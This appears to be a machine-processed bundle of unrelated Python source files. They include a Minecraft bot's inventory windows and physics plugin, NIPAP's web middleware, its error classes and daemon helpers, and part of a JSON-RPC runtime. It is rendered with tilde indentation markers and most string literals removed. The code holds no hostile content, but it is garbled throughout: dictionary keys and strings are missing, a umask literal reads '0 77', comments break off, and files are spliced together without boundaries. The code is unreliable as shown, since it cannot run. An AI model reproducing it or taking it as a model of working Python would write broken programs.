~~~ slot_nr = constants . INV_OUTSIDE_WINDOW \n 
~~ return { \n 
: slot_nr , \n 
: self . button , \n 
: 0 , \n 
: self . slot . get_dict ( ) , \n 
} \n 
\n 
~~ def apply ( self , inv_plugin ) : \n 
~~~ clicked = self . slot \n 
cursor = inv_plugin . cursor_slot \n 
if clicked == cursor : \n 
~~~ if self . button == constants . INV_BUTTON_LEFT : \n 
~~~ clicked . amount = 0 \n 
~~ elif self . button == constants . INV_BUTTON_RIGHT : \n 
~~~ clicked . amount -= 1 \n 
~~ self . cleanup_if_empty ( clicked ) \n 
~~ elif self . button == constants . INV_BUTTON_LEFT : \n 
~~~ if clicked . stacks_with ( cursor ) : \n 
~~~ self . transfer ( cursor , clicked , cursor . amount ) \n 
~~ else : \n 
~~~ self . swap_slots ( cursor , clicked ) \n 
~~ ~~ elif self . button == constants . INV_BUTTON_RIGHT : \n 
~~~ if cursor . is_empty : \n 
# transfer half, round up \n 
~~~ self . transfer ( clicked , cursor , ( clicked . amount + 1 ) // 2 ) \n 
~~ elif clicked . is_empty or clicked . stacks_with ( cursor ) : \n 
~~~ self . transfer ( cursor , clicked , 1 ) \n 
~~ else : # slot items do not stack \n 
~~~ self . swap_slots ( cursor , clicked ) \n 
~~ ~~ else : \n 
~~~ raise NotImplementedError ( \n 
% self . button ) \n 
\n 
\n 
~~ ~~ ~~ class DropClick ( BaseClick ) : \n 
~~~ def __init__ ( self , slot , drop_stack = False ) : \n 
~~~ self . slot = slot \n 
self . drop_stack = drop_stack \n 
\n 
~~ def get_packet ( self , inv_plugin ) : \n 
~~~ if self . slot == inv_plugin . cursor_slot : \n 
~~~ raise ValueError ( "Can\'t drop cursor slot, use SingleClick" ) \n 
~~ if not inv_plugin . cursor_slot . is_empty : \n 
~~~ raise ValueError ( "Can\'t drop other slots: cursor slot is occupied" ) \n 
\n 
~~ return { \n 
: self . slot . slot_nr , \n 
: 1 if self . drop_stack else 0 , \n 
: 4 , \n 
: inv_plugin . cursor_slot . get_dict ( ) , \n 
} \n 
\n 
~~ def apply ( self , inv_plugin ) : \n 
~~~ if self . drop_stack : \n 
~~~ self . slot . amount = 0 \n 
~~ else : \n 
~~~ self . slot . amount -= 1 \n 
~~ self . cleanup_if_empty ( self . slot ) \n 
\n 
\n 
~~ ~~ class Window ( object ) : \n 
~~~ """ Base class for all inventory types. """ \n 
\n 
name = None \n 
inv_type = None \n 
inv_data = { } \n 
\n 
# the arguments must have the same names as the keys in the packet dict \n 
def __init__ ( self , window_id , title , slot_count , \n 
inv_type = None , persistent_slots = None , eid = None ) : \n 
~~~ assert not inv_type or inv_type == self . inv_type , % ( inv_type , self . inv_type ) \n 
self . is_storage = slot_count > 0 # same after re-opening window \n 
if not self . is_storage : # get number of temporary slots \n 
~~~ window_dict = windows_by_id [ inv_type ] \n 
if in window_dict : \n 
~~~ slot_count = max ( slot [ ] + slot . get ( , 1 ) \n 
for slot in window_dict [ ] ) \n 
~~ ~~ self . window_id = window_id \n 
self . title = title \n 
self . eid = eid # used for horses \n 
\n 
# window slots vary, but always end with main inventory and hotbar \n 
# create own slots, ... \n 
self . slots = [ Slot ( self , slot_nr ) for slot_nr in range ( slot_count ) ] \n 
# ... append persistent slots (main inventory and hotbar) \n 
if persistent_slots is None : \n 
~~~ for slot_nr in range ( constants . INV_SLOTS_PERSISTENT ) : \n 
~~~ self . slots . append ( Slot ( self , slot_nr + slot_count ) ) \n 
~~ ~~ else : # persistent slots have to be moved from other inventory \n 
~~~ moved_slots = persistent_slots [ - constants . INV_SLOTS_PERSISTENT : ] \n 
for slot_nr , moved_slot in enumerate ( moved_slots ) : \n 
~~~ moved_slot . move_to_window ( self , slot_nr + slot_count ) \n 
self . slots . append ( moved_slot ) \n 
\n 
# additional info dependent on inventory type, \n 
# dynamically updated by server \n 
~~ ~~ self . properties = { } \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return % ( \n 
self . __class__ . __name__ , \n 
self . window_id , self . title , len ( self . slots ) ) \n 
\n 
~~ @ property \n 
def persistent_slots ( self ) : \n 
~~~ return self . slots [ - constants . INV_SLOTS_PERSISTENT : ] \n 
\n 
~~ @ property \n 
def inventory_slots ( self ) : \n 
~~~ return self . slots [ \n 
- constants . INV_SLOTS_PERSISTENT : - constants . INV_SLOTS_HOTBAR ] \n 
\n 
~~ @ property \n 
def hotbar_slots ( self ) : \n 
~~~ return self . slots [ - constants . INV_SLOTS_HOTBAR : ] \n 
\n 
~~ @ property \n 
def window_slots ( self ) : \n 
~~~ """All slots except inventory and hotbar. Useful for searching.""" \n 
return self . slots [ : - constants . INV_SLOTS_PERSISTENT ] \n 
\n 
\n 
# Helpers for creating the window classes \n 
\n 
~~ ~~ def _make_window ( window_dict ) : \n 
~~~ """\n    Creates a new class for that window and registers it at this module.\n    """ \n 
cls_name = % camel_case ( str ( window_dict [ ] ) ) \n 
bases = ( Window , ) \n 
attrs = { \n 
: sys . modules [ __name__ ] , \n 
: str ( window_dict [ ] ) , \n 
: str ( window_dict [ ] ) , \n 
: window_dict , \n 
} \n 
\n 
# creates function-local index and size variables \n 
def make_slot_method ( index , size = 1 ) : \n 
~~~ if size == 1 : \n 
~~~ return lambda self : self . slots [ index ] \n 
~~ else : \n 
~~~ return lambda self : self . slots [ index : ( index + size ) ] \n 
\n 
~~ ~~ for slots in window_dict . get ( , [ ] ) : \n 
~~~ index = slots [ ] \n 
size = slots . get ( , 1 ) \n 
attr_name = snake_case ( str ( slots [ ] ) ) \n 
attr_name += if size == 1 else \n 
slots_method = make_slot_method ( index , size ) \n 
slots_method . __name__ = attr_name \n 
attrs [ attr_name ] = property ( slots_method ) \n 
\n 
~~ for i , prop_name in enumerate ( window_dict . get ( , [ ] ) ) : \n 
~~~ def make_prop_method ( i ) : \n 
~~~ return lambda self : self . properties [ i ] \n 
~~ prop_method = make_prop_method ( i ) \n 
prop_name = snake_case ( str ( prop_name ) ) \n 
prop_method . __name__ = prop_name \n 
attrs [ prop_name ] = property ( prop_method ) \n 
\n 
~~ cls = type ( cls_name , bases , attrs ) \n 
assert not hasattr ( sys . modules [ __name__ ] , cls_name ) , \'Window "%s" already registered at %s\' % ( cls_name , __name__ ) \n 
setattr ( sys . modules [ __name__ ] , cls_name , cls ) \n 
return cls \n 
\n 
\n 
# look up a class by window type ID, e.g. when opening windows \n 
~~ inv_types = { } \n 
\n 
\n 
def _create_windows ( ) : \n 
~~~ for window in windows_list : \n 
~~~ cls = _make_window ( window ) \n 
inv_types [ cls . inv_type ] = cls \n 
\n 
# Create all window classes from minecraft_data \n 
~~ ~~ _create_windows ( ) \n 
\n 
# get the PlayerWindow, which was just generated during runtime \n 
_player_window = sys . modules [ __name__ ] . PlayerWindow \n 
\n 
\n 
# override constructor of PlayerWindow \n 
def _player_init ( self , * args , ** kwargs ) : \n 
~~~ super ( _player_window , self ) . __init__ ( \n 
constants . INV_WINID_PLAYER , self . name , constants . INV_SLOTS_PLAYER , \n 
* args , ** kwargs ) \n 
\n 
~~ setattr ( _player_window , , _player_init ) \n 
"""\nA Physics module built from clean-rooming the Notchian Minecraft client\n\nCollision detection and resolution is done by a Separating Axis Theorem\nimplementation for concave shapes decomposed into Axis-Aligned Bounding Boxes.\nThis isn\'t totally equivalent to vanilla behavior, but it\'s faster and\nClose Enough^TM\n\nAKA this file does Minecraft physics\n""" \n 
\n 
import collections \n 
import logging \n 
import math \n 
\n 
from spockbot . mcdata import blocks , constants as const \n 
from spockbot . mcdata . utils import BoundingBox \n 
from spockbot . plugins . base import PluginBase , pl_announce \n 
from spockbot . plugins . tools import collision \n 
from spockbot . vector import Vector3 \n 
\n 
logger = logging . getLogger ( ) \n 
\n 
FP_MAGIC = 1e-4 \n 
\n 
\n 
class PhysicsCore ( object ) : \n 
~~~ def __init__ ( self , pos , vec , abilities ) : \n 
~~~ self . pos = pos \n 
self . vec = vec \n 
self . sprinting = False \n 
self . move_accel = abilities . walking_speed \n 
self . abilities = abilities \n 
self . direction = Vector3 ( ) \n 
\n 
~~ def jump ( self ) : \n 
~~~ if self . pos . on_ground : \n 
~~~ if self . sprinting : \n 
~~~ ground_speed = Vector3 ( self . vec . x , 0 , self . vec . z ) \n 
if ground_speed : \n 
~~~ self . vec += ground_speed . norm ( ) * const . PHY_JMP_MUL \n 
~~ ~~ self . vec . y = const . PHY_JMP_ABS \n 
\n 
~~ ~~ def walk ( self ) : \n 
~~~ self . sprinting = False \n 
self . move_accel = self . abilities . walking_speed \n 
\n 
~~ def sprint ( self ) : \n 
~~~ self . sprinting = True \n 
self . move_accel = self . abilities . walking_speed * const . PHY_SPR_MUL \n 
\n 
~~ def move_target ( self , vector ) : \n 
~~~ self . direction = vector - self . pos \n 
self . direction . y = 0 \n 
if self . direction <= Vector3 ( self . vec . x , 0 , self . vec . z ) : \n 
~~~ return True \n 
\n 
~~ ~~ def move_vector ( self , vector ) : \n 
~~~ vector . y = 0 \n 
self . direction = vector \n 
\n 
~~ def move_angle ( self , angle , radians = False ) : \n 
~~~ angle = angle if radians else math . radians ( angle ) \n 
self . direction = Vector3 ( math . sin ( angle ) , 0 , math . cos ( angle ) ) \n 
\n 
\n 
~~ ~~ @ pl_announce ( ) \n 
class PhysicsPlugin ( PluginBase ) : \n 
~~~ requires = ( , , , ) \n 
events = { \n 
: , \n 
: , \n 
: , \n 
: , \n 
: , \n 
} \n 
\n 
def __init__ ( self , ploader , settings ) : \n 
~~~ super ( PhysicsPlugin , self ) . __init__ ( ploader , settings ) \n 
self . vec = Vector3 ( 0.0 , 0.0 , 0.0 ) \n 
self . col = collision . MTVTest ( \n 
self . world , BoundingBox ( const . PLAYER_WIDTH , const . PLAYER_HEIGHT ) \n 
) \n 
self . pos = self . clientinfo . position \n 
self . skip_tick = False \n 
self . pc = PhysicsCore ( self . pos , self . vec , self . clientinfo . abilities ) \n 
ploader . provides ( , self . pc ) \n 
\n 
~~ def skip_physics ( self , _ = None , __ = None ) : \n 
~~~ self . vec . zero ( ) \n 
self . skip_tick = True \n 
\n 
~~ def suspend_physics ( self , _ = None , __ = None ) : \n 
~~~ self . vec . zero ( ) \n 
self . event . unreg_event_handler ( , self . physics_tick ) \n 
\n 
~~ def resume_physics ( self , _ = None , __ = None ) : \n 
~~~ self . event . reg_event_handler ( , self . physics_tick ) \n 
\n 
~~ def client_tick ( self , name , data ) : \n 
~~~ self . net . push_packet ( , \n 
self . clientinfo . position . get_dict ( ) ) \n 
\n 
~~ def physics_tick ( self , _ , __ ) : \n 
~~~ if self . skip_tick : \n 
~~~ self . skip_tick = False \n 
return \n 
~~ self . apply_accel ( ) \n 
mtv = self . get_mtv ( ) \n 
self . apply_vector ( mtv ) \n 
self . pos . on_ground = mtv . y > 0 \n 
self . vec -= Vector3 ( 0 , const . PHY_GAV_ACC , 0 ) \n 
self . apply_drag ( ) \n 
self . pc . direction = Vector3 ( ) \n 
\n 
~~ def get_block_slip ( self ) : \n 
~~~ if self . pos . on_ground : \n 
~~~ bpos = self . pos . floor ( ) \n 
return blocks . get_block ( * self . world . get_block ( * bpos ) ) . slipperiness \n 
~~ return 1 \n 
\n 
~~ def apply_accel ( self ) : \n 
~~~ if not self . pc . direction : \n 
~~~ return \n 
~~ if self . pos . on_ground : \n 
~~~ block_slip = self . get_block_slip ( ) \n 
accel_mod = const . BASE_GND_SLIP ** 3 / block_slip ** 3 \n 
accel = self . pc . move_accel * accel_mod * const . PHY_BASE_DRG \n 
~~ else : \n 
~~~ accel = const . PHY_JMP_ACC \n 
~~ self . vec += self . pc . direction . norm ( ) * accel \n 
\n 
~~ def apply_vector ( self , mtv ) : \n 
~~~ self . pos += ( self . vec + mtv ) \n 
self . vec . x = 0 if mtv . x else self . vec . x \n 
self . vec . y = 0 if mtv . y else self . vec . y \n 
self . vec . z = 0 if mtv . z else self . vec . z \n 
\n 
~~ def apply_drag ( self ) : \n 
~~~ drag = self . get_block_slip ( ) * const . PHY_DRG_MUL \n 
self . vec . x *= drag \n 
self . vec . z *= drag \n 
self . vec . y *= const . PHY_BASE_DRG \n 
\n 
# Breadth-first search for a minimum translation vector \n 
~~ def get_mtv ( self ) : \n 
~~~ pos = self . pos + self . vec \n 
pos = collision . uncenter_position ( pos , self . col . bbox ) \n 
q = collections . deque ( ( Vector3 ( ) , ) ) \n 
while q : \n 
~~~ current_vector = q . popleft ( ) \n 
transform_vectors = self . col . check_collision ( pos , current_vector ) \n 
if not all ( transform_vectors ) : \n 
~~~ break \n 
~~ for vector in transform_vectors : \n 
~~~ test_vec = self . vec + current_vector + vector \n 
if test_vec . dist_sq ( ) <= self . vec . dist_sq ( ) + FP_MAGIC : \n 
~~~ q . append ( current_vector + vector ) \n 
~~ ~~ ~~ else : \n 
~~~ logger . debug ( ) \n 
self . vec . zero ( ) \n 
return Vector3 ( ) \n 
~~ possible_mtv = [ current_vector ] \n 
while q : \n 
~~~ current_vector = q . popleft ( ) \n 
transform_vectors = self . col . check_collision ( pos , current_vector ) \n 
if not all ( transform_vectors ) : \n 
~~~ possible_mtv . append ( current_vector ) \n 
~~ ~~ return min ( possible_mtv ) \n 
~~ ~~ """Pylons middleware initialization""" \n 
from beaker . middleware import SessionMiddleware \n 
from paste . cascade import Cascade \n 
from paste . registry import RegistryManager \n 
from paste . urlparser import StaticURLParser \n 
from paste . deploy . converters import asbool \n 
from pylons . middleware import ErrorHandler , StatusCodeRedirect \n 
from pylons . wsgiapp import PylonsApp \n 
from routes . middleware import RoutesMiddleware \n 
\n 
from nipapwww . config . environment import load_environment \n 
\n 
def make_app ( global_conf , full_stack = True , static_files = True , ** app_conf ) : \n 
~~~ """Create a Pylons WSGI application and return it\n\n    ``global_conf``\n        The inherited configuration for this application. Normally from\n        the [DEFAULT] section of the Paste ini file.\n\n    ``full_stack``\n        Whether this application provides a full WSGI stack (by default,\n        meaning it handles its own exceptions and errors). Disable\n        full_stack when this application is "managed" by another WSGI\n        middleware.\n\n    ``static_files``\n        Whether this application serves its own static files; disable\n        when another web server is responsible for serving them.\n\n    ``app_conf``\n        The application\'s local configuration. Normally specified in\n        the [app:<name>] section of the Paste ini file (where <name>\n        defaults to main).\n\n    """ \n 
# Configure the Pylons environment \n 
config = load_environment ( global_conf , app_conf ) \n 
\n 
# The Pylons WSGI app \n 
app = PylonsApp ( config = config ) \n 
\n 
# Routing/Session Middleware \n 
app = RoutesMiddleware ( app , config [ ] , singleton = False ) \n 
app = SessionMiddleware ( app , config ) \n 
\n 
# CUSTOM MIDDLEWARE HERE (filtered by error handling middlewares) \n 
\n 
if asbool ( full_stack ) : \n 
# Handle Python exceptions \n 
~~~ app = ErrorHandler ( app , global_conf , ** config [ ] ) \n 
\n 
# Display error documents for 401, 403, 404 status codes (and \n 
# 500 when debug is disabled) \n 
if asbool ( config [ ] ) : \n 
~~~ app = StatusCodeRedirect ( app ) \n 
~~ else : \n 
~~~ app = StatusCodeRedirect ( app , [ 400 , 401 , 403 , 404 , 500 ] ) \n 
\n 
# Establish the Registry for this application \n 
~~ ~~ app = RegistryManager ( app ) \n 
\n 
if asbool ( static_files ) : \n 
# Serve static files \n 
~~~ static_app = StaticURLParser ( config [ ] [ ] ) \n 
app = Cascade ( [ static_app , app ] ) \n 
~~ app . config = config \n 
return app \n 
\n 
~~ class NipapError ( Exception ) : \n 
~~~ """ NIPAP base error class.\n    """ \n 
\n 
error_code = 1000 \n 
\n 
\n 
~~ class NipapInputError ( NipapError ) : \n 
~~~ """ Erroneous input.\n\n        A general input error.\n    """ \n 
\n 
error_code = 1100 \n 
\n 
\n 
~~ class NipapMissingInputError ( NipapInputError ) : \n 
~~~ """ Missing input.\n\n        Most input is passed in dicts, this could mean a missing key in a dict.\n    """ \n 
\n 
error_code = 1110 \n 
\n 
\n 
~~ class NipapExtraneousInputError ( NipapInputError ) : \n 
~~~ """ Extraneous input.\n\n        Most input is passed in dicts, this could mean an unknown key in a dict.\n    """ \n 
\n 
error_code = 1120 \n 
\n 
\n 
~~ class NipapNoSuchOperatorError ( NipapInputError ) : \n 
~~~ """ A non existent operator was specified.\n    """ \n 
\n 
error_code = 1130 \n 
\n 
\n 
~~ class NipapValueError ( NipapError ) : \n 
~~~ """ Something wrong with a value\n\n        For example, trying to send an integer when an IP address is expected.\n    """ \n 
\n 
error_code = 1200 \n 
\n 
\n 
~~ class NipapNonExistentError ( NipapError ) : \n 
~~~ """ A non existent object was specified\n\n        For example, try to get a prefix from a pool which doesn\'t exist.\n    """ \n 
\n 
error_code = 1300 \n 
\n 
\n 
~~ class NipapDuplicateError ( NipapError ) : \n 
~~~ """ The passed object violates unique constraints\n\n        For example, create a VRF with a name of an already existing one.\n    """ \n 
\n 
error_code = 1400 \n 
~~ import os \n 
\n 
__version__ = "0.28.4" \n 
__author__ = "Kristian Larsson, Lukas Garberg" \n 
__author_email__ = "kll@tele2.net, lukas@spritelink.net" \n 
__copyright__ = "Copyright 2011-2014, Kristian Larsson, Lukas Garberg" \n 
__license__ = "MIT" \n 
__status__ = "Development" \n 
__url__ = "http://SpriteLink.github.com/NIPAP" \n 
\n 
\n 
# Default daemon parameters. \n 
# File mode creation mask of the daemon. \n 
UMASK = 0 \n 
\n 
# Default working directory for the daemon. \n 
WORKDIR = "/" \n 
\n 
# Default maximum for the number of available file descriptors. \n 
MAXFD = 1024 \n 
\n 
# The standard I/O file descriptors are redirected to /dev/null by default. \n 
if ( hasattr ( os , "devnull" ) ) : \n 
~~~ REDIRECT_TO = os . devnull \n 
~~ else : \n 
~~~ REDIRECT_TO = "/dev/null" \n 
\n 
~~ def createDaemon ( ) : \n 
~~~ """Detach a process from the controlling terminal and run it in the\n   background as a daemon.\n   """ \n 
\n 
try : \n 
# Fork a child process so the parent can exit.  This returns control to \n 
# the command-line or shell.  It also guarantees that the child will not \n 
# be a process group leader, since the child receives a new process ID \n 
\n 
# to insure that the next call to os.setsid is successful. \n 
~~~ pid = os . fork ( ) \n 
~~ except OSError , e : \n 
~~~ raise Exception , "%s [%d]" % ( e . strerror , e . errno ) \n 
\n 
~~ if ( pid == 0 ) : # The first child. \n 
# To become the session leader of this new session and the process group \n 
# leader of the new process group, we call os.setsid().  The process is \n 
# also guaranteed not to have a controlling terminal. \n 
~~~ os . setsid ( ) \n 
\n 
# Is ignoring SIGHUP necessary? \n 
# \n 
\n 
# the second fork to avoid premature termination of the process.  The \n 
# reason is that when the first child terminates, all processes, e.g. \n 
# the second child, in the orphaned group will be sent a SIGHUP. \n 
# \n 
# "However, as part of the session management system, there are exactly \n 
# two cases where SIGHUP is sent on the death of a process: \n 
# \n 
#   1) When the process that dies is the session leader of a session that \n 
#      is attached to a terminal device, SIGHUP is sent to all processes \n 
#      in the foreground process group of that terminal device. \n 
#   2) When the death of a process causes a process group to become \n 
#      orphaned, and one or more processes in the orphaned group are \n 
#      stopped, then SIGHUP and SIGCONT are sent to all members of the \n 
#      orphaned group." [2] \n 
# \n 
# The first case can be ignored since the child is guaranteed not to have \n 
\n 
# The process group is orphaned when the first child terminates and \n 
# POSIX.1 requires that every STOPPED process in an orphaned process \n 
# group be sent a SIGHUP signal followed by a SIGCONT signal.  Since the \n 
# second child is not STOPPED though, we can safely forego ignoring the \n 
# SIGHUP signal.  In any case, there are no ill-effects if it is ignored. \n 
# \n 
# import signal           # Set handlers for asynchronous events. \n 
# signal.signal(signal.SIGHUP, signal.SIG_IGN) \n 
\n 
try : \n 
# Fork a second child and exit immediately to prevent zombies.  This \n 
# causes the second child process to be orphaned, making the init \n 
# process responsible for its cleanup.  And, since the first child is \n 
\n 
# it to acquire one by opening a terminal in the future (System V- \n 
# based systems).  This second fork guarantees that the child is no \n 
# longer a session leader, preventing the daemon from ever acquiring \n 
# a controlling terminal. \n 
~~~ pid = os . fork ( ) # Fork a second child. \n 
~~ except OSError , e : \n 
~~~ raise Exception , "%s [%d]" % ( e . strerror , e . errno ) \n 
\n 
~~ if ( pid == 0 ) : # The second child. \n 
# Since the current working directory may be a mounted filesystem, we \n 
# avoid the issue of not being able to unmount the filesystem at \n 
# shutdown time by changing it to the root directory. \n 
~~~ os . chdir ( WORKDIR ) \n 
\n 
# the parent, so we give the child complete control over permissions. \n 
os . umask ( UMASK ) \n 
~~ else : \n 
# exit() or _exit()?  See below. \n 
~~~ os . _exit ( 0 ) # Exit parent (the first child) of the second child. \n 
~~ ~~ else : \n 
# exit() or _exit()? \n 
\n 
# with atexit (and on_exit) or any registered signal handlers.  It also \n 
# closes any open file descriptors.  Using exit() may cause all stdio \n 
# streams to be flushed twice and any temporary files may be unexpectedly \n 
\n 
# and the parent branch(es) of a daemon use _exit(). \n 
~~~ os . _exit ( 0 ) # Exit parent of the first child. \n 
\n 
# Close all open file descriptors.  This prevents the child from keeping \n 
# open any file descriptors inherited from the parent.  There is a variety \n 
# of methods to accomplish this task.  Three are listed below. \n 
# \n 
# Try the system configuration variable, SC_OPEN_MAX, to obtain the maximum \n 
\n 
# the default value (configurable). \n 
# \n 
# try: \n 
#    maxfd = os.sysconf("SC_OPEN_MAX") \n 
# except (AttributeError, ValueError): \n 
#    maxfd = MAXFD \n 
# \n 
# OR \n 
# \n 
# if (os.sysconf_names.has_key("SC_OPEN_MAX")): \n 
#    maxfd = os.sysconf("SC_OPEN_MAX") \n 
# else: \n 
#    maxfd = MAXFD \n 
# \n 
# OR \n 
# \n 
# Use the getrlimit method to retrieve the maximum file descriptor number \n 
# that can be opened by this process.  If there is not limit on the \n 
# resource, use the default value. \n 
# \n 
~~ import resource # Resource usage information. \n 
maxfd = resource . getrlimit ( resource . RLIMIT_NOFILE ) [ 1 ] \n 
if ( maxfd == resource . RLIM_INFINITY ) : \n 
~~~ maxfd = MAXFD \n 
\n 
\n 
# Iterate through and close all file descriptors. \n 
#   for fd in range(0, maxfd): \n 
#      try: \n 
#         os.close(fd) \n 
\n 
#         pass \n 
\n 
# Redirect the standard I/O file descriptors to the specified file.  Since \n 
# the daemon has no controlling terminal, most daemons redirect stdin, \n 
# stdout, and stderr to /dev/null.  This is done to prevent side-effects \n 
# from reads and writes to the standard I/O file descriptors. \n 
\n 
# This call to open is guaranteed to return the lowest file descriptor, \n 
# which will be 0 (stdin), since it was closed above. \n 
~~ os . open ( REDIRECT_TO , os . O_RDWR ) # standard input (0) \n 
\n 
# Duplicate standard input to standard output and standard error. \n 
os . dup2 ( 0 , 1 ) # standard output (1) \n 
os . dup2 ( 0 , 2 ) # standard error (2) \n 
\n 
return ( 0 ) \n 
\n 
\n 
\n 
~~ def drop_privileges ( uid_name = , gid_name = ) : \n 
~~~ if os . getuid ( ) != 0 : \n 
~~~ raise Exception ( "non-root user cannot drop privileges" ) \n 
\n 
~~ import pwd , grp \n 
# Get the uid/gid from the name \n 
uid = pwd . getpwnam ( uid_name ) . pw_uid \n 
gid = grp . getgrnam ( gid_name ) . gr_gid \n 
\n 
# Remove group privileges \n 
os . setgroups ( [ ] ) \n 
\n 
# Try setting the new uid/gid \n 
os . setgid ( gid ) \n 
os . setuid ( uid ) \n 
\n 
# Ensure a very conservative umask \n 
old_umask = os . umask ( 0 77 ) \n 
~~ """\n    Barrister runtime for Python.  Includes all classes used when writing a client or server.\n    Hacked up for StackHut by StackHut :) Thx\n    :copyright: 2012 by James Cooper.\n    :license: MIT, see LICENSE for more details.\n""" \n 
import urllib . request \n 
import urllib . error \n 
import urllib . parse \n 
import uuid \n 
import itertools \n 
import logging \n 
import json \n 
\n 
from . exceptions import InvalidFunctionError \n 
\n 
\n 
# JSON-RPC standard error codes \n 
ERR_PARSE = - 32700 \n 
ERR_INVALID_REQ = - 32600 \n 
ERR_METHOD_NOT_FOUND = - 32601 \n 
ERR_INVALID_PARAMS = - 32602 \n 
ERR_INTERNAL = - 32603 \n 
\n 
# Our extensions \n 
ERR_UNKNOWN = - 32000 \n 
ERR_INVALID_RESP = - 32001 \n 
\n 
\n 
def contract_from_file ( fname ) : \n 
~~~ """\n    Loads a Barrister IDL JSON from the given file and returns a Contract class\n\n    :Parameters:\n      fname\n        Filename containing Barrister IDL JSON to load\n    """ \n 
f = open ( fname ) \n 
j = f . read ( ) \n 
f . close ( ) \n 
return Contract ( json . loads ( j ) ) \n 
\n 
\n 
~~ def unpack_method ( method ) : \n 
~~~ """\n    Given a JSON-RPC method in:  [interface].[function] notation, returns a tuple of the interface\n    name and function.\n\n    For example, unpack_method("MyService.LoadUser") would return: ("MyService", "LoadUser")\n\n    :Parameters:\n      method\n        String method name\n    """ \n 
pos = method . find ( "." ) \n 
if pos == - 1 : \n 
~~~ raise RpcException ( ERR_METHOD_NOT_FOUND , "Method not found: %s" % method ) \n 
\n 
~~ iface_name = method [ : pos ] \n 
func_name = method [ pos + 1 : ] \n 
return iface_name , func_name \n 
\n 
\n 
~~ def idgen_uuid ( ) : \n 
~~~ """\n    Generates a uuid4 (random) and returns the hex representation as a string\n    """ \n 
return uuid . uuid4 ( ) . hex \n 
\n 
\n 
~~ idgen_seq_counter = itertools . count ( ) \n 
\n 
\n 
def idgen_seq ( ) : \n 
~~~ """\n    Generates an ID using itertools.count() and returns it as a string\n    """ \n 
return str ( next ( idgen_seq_counter ) ) \n 
\n 
\n 
~~ def err_response ( reqid , code , msg , data = None ) : \n 
~~~ """\n    Formats a JSON-RPC error as a dict with keys: \'jsonrpc\', \'id\', \'error\'\n    """ \n 
err = { "code" : code , "message" : msg } \n 
if data : \n 
~~~ err [ "data" ] = data \n 
~~ return { "jsonrpc" : "2.0" , "id" : reqid , "error" : err } \n 
\n 
\n 
~~ def safe_get ( d , key , def_val = None ) : \n 
~~~ """\n    Helper function to fetch value from a dictionary\n\n    * `d` - Dictionary to fetch value from\n    * `key` - Key to lookup in dictionary\n    * `def_val` - Default value to return if dict does not have a member with key\n    """ \n 
if key in d : \n 
~~~ return d [ key ] \n 
~~ else : \n 
~~~ return def_val \n 
\n 
\n 
~~ ~~ class RpcException ( Exception , json . JSONEncoder ) : \n 
~~~ """\n    Represents a JSON-RPC style exception.  Server implementations should raise this\n    exception if they wish to communicate error codes back to Barrister clients.\n    """ \n 
\n 
def __init__ ( self , code , msg = "" , data = None ) : \n 
~~~ """\n        Creates a new RpcException\n\n        :Parameters:\n          code\n            Integer representing the error type. Applications may use any positive integer.\n          msg\n            Human readable description of the error\n          data\n            Optional extra info about the error. Should be a string, int, or list or dict of strings/ints\n        """ \n 
self . code = code \n 
self . msg = msg \n 
self . data = data \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ s = "RpcException: code=%d msg=%s" % ( self . code , self . msg ) \n 
if self . data : \n 
~~~ s += " data=%s" % ( str ( self . data ) ) \n 
~~ return s \n 
\n 
\n 
~~ ~~ class RequestContext ( object ) : \n 
~~~ """\n    Stores state about a single request, including properties passed\n    into Server.call\n    """ \n 
\n 
def __init__ ( self , props , req ) : \n 
~~~ """\n        Creates a new RequestContext\n\n        :Parameters:\n          props\n            Dict of meta properties for this request\n          req\n            Dict that represents a single JSON-RPC request\n        """ \n 
self . props = props \n 
self . request = req \n 
self . response = None \n 
self . error = None \n 
\n 
~~ def func_name ( self ) : \n 
~~~ return unpack_method ( self . request [ "method" ] ) [ 1 ] \n 
\n 
~~ def get_prop ( self , key , default_val = None ) : \n 
~~~ """\n        Returns a property set on the context.\n\n        :Parameters:\n          key\n            String key to lookup in the context props dict\n          default_val\n            Value to return if key is not set on the context props\n        """ \n 
if key in self . props : \n 
~~~ return self . props [ key ] \n 
~~ else : \n 
~~~ return default_val \n 
\n 
~~ ~~ def set_error ( self , code , msg , data = None ) : \n 
~~~ """\n        Set an error on this request, which will prevent request execution.\n        Should only be called from "pre" hook methods.  If called from a post hook, this\n        operation will be ignored.\n\n        :Parameters:\n          code\n            Integer error code\n          msg\n            String description of the error\n          data\n            Optional additional info about the error. Should be a primitive, or a list or\n            dict of primitives to avoid serialization issues.\n        """ \n 
self . error = err_response ( self . request [ "id" ] , code , msg , data ) \n 
\n 
\n 
~~ ~~ class Filter ( object ) : \n 
~~~ """\n    Base filter class that implements pre and post functions, but no-ops for both.\n    Subclass this and override pre/post to add filter functionality for your app.\n    """ \n 
\n 
def pre ( self , context ) : \n 
~~~ """\n        Pre-Handler hook.  Called before the RPC request handler is invoked.\n        If context.send_error is called by any pre filter, then the request handler will\n        not be invoked, and the error will be returned instead.\n\n        :Parameters:\n          context\n            RequestContext instance for this request\n        """ \n 
pass \n 
\n 
~~ def post ( self , context ) : \n 
~~~ """\n        Post-Handler hook.  Called after the RPC request handler is invoked.\n        Post handlers can inspect and log the response, but should not alter it.\n\n        :Parameters:\n          context\n            RequestContext instance for this request\n        """ \n 
pass \n 
\n 
\n 
~~ ~~ class Server ( object ) : \n 
~~~ """\n    Dispatches requests to user created handler classes based on method name.\n    Also responsible for validating requests and responses to ensure they conform to the\n    IDL Contract.\n    """ \n 
\n 
def __init__ ( self , contract , validate_request = True , validate_response = True ) : \n 
~~~ """\n        Creates a new Server\n\n        :Parameters:\n          contract\n            Contract instance that this server should use\n          validate_request\n            If True, requests will be validated against the Contract and rejected if they are malformed\n          validate_response\n            If True, responses from handler methods will be validated against the Contract and rejected\n            if they are malformed\n        """ \n 
logging . basicConfig ( ) \n 
self . log = logging . getLogger ( "common.barrister" ) \n 
self . validate_req = validate_request \n 
self . validate_resp = validate_response \n 
self . contract = contract \n 
self . handlers = { } \n 
self . filters = None \n 
\n 
~~ def add_handler ( self , iface_name , handler ) : \n 
~~~ """\n        Associates the given handler with the interface name.  If the interface does not exist in\n        the Contract, an RpcException is raised.\n\n        :Parameters:\n          iface_name\n            Name of interface that this handler implements\n          handler\n            Instance of a class that implements all functions defined on the interface\n        """ \n 
if self . contract . has_interface ( iface_name ) : \n 
~~~ self . handlers [ iface_name ] = handler \n 
~~ else : \n 
